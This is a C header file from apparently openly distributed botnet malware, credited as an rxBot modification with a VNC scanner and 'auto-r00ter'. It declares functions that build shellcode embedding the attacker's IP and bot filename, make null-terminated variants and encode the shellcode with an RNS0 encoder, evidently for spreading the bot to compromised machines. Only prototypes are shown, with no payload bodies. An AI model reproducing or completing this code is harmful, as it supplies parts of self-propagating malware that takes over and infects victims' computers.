/*/*

    ri0t r00t b0t by h1t3m of h1t3m.org | h4cky0u.org

     (rxBot MP modded with vnc scanner / auto-r00ter)

*/


DWORD GetShellcodeSize(char *ownip, char *botfilename);
DWORD GetShellcode(char *buffer, DWORD buffersize, char *ownip, char *botfilename);

DWORD GetRNS0TerminatedShellcodeSize(char *ownip, char *botfilename);
DWORD GetRNS0TerminatedShellcode(char *buffer, DWORD buffersize, char *ownip, char *botfilename);

DWORD GetRNS0EncodedSize(DWORD shellcodesize);
DWORD EncodeRNS0(char *buffer, DWORD buffersize, char *shellcode, DWORD shellcodesize);
